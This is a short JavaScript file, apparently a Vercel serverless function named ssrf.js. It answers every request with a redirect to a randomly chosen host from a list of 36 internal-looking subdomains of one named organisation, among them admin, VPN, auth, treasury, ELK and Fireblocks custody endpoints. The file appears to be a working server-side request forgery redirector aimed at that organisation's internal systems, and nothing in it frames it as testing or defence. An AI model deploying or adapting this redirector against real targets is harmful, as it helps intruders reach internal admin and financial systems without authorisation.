// pages/api/ssrf.js (Vercel Serverless Function)
const targets = [
  'http://admin.bumba.global/',
  'http://admin.status.bumba.global/',
  'http://cms.bumba.global/',
  'http://sandbox-auth.bumba.global/',
  'http://tcms.bumba.global/',
  'http://eramba.bumba.global/',
  'http://redmine.bumba.global/',
  'http://auth.bumba.global/',
  'http://vpn.bumba.global/',
  'http://fireblocks-api.bumba.global/',
  'http://middleware-api.bumba.global/',
  'http://sandbox1.bumba.global/',
  'http://app-staging.bumba.global/',
  'http://b2c2-hedging-adapter.bumba.global/',
  'http://status.bumba.global/',
  'http://ap.bumba.global/',
  'http://treasury-api.bumba.global/',
  'http://cms-staging.bumba.global/',
  'http://fireblocks-mainnet.bumba.global/',
  'http://treasury-sandbox.bumba.global/',
  'http://autodiscover.bumba.global/',
  'http://elk.bumba.global/',
  'http://fns-login.bumba.global/',
  'http://middleware-api-sandbox.bumba.global/',
  'http://treasury.bumba.global/',
  'http://treasury-sandbox-login.bumba.global/',
  'http://treasury-api-v2.bumba.global/',
  'http://lyncdiscover.bumba.global/',
  'http://sandbox.bumba.global/',
  'http://coinbase-hedging-adapter.bumba.global/',
  'http://treasury-api-sandbox.bumba.global/',
  'http://middleware-api-sandbox1.bumba.global/',
  'http://tm.bumba.global/',
  'http://mm.bumba.global/',
  'http://msoid.bumba.global/',
  'http://exchange-api.bumba.global/',
];

export default function handler(req, res) {
  const index = Math.floor(Math.random() * targets.length);
  const redirectTarget = targets[index];

  res.writeHead(302, {
    Location: redirectTarget
  });
  res.end();
}
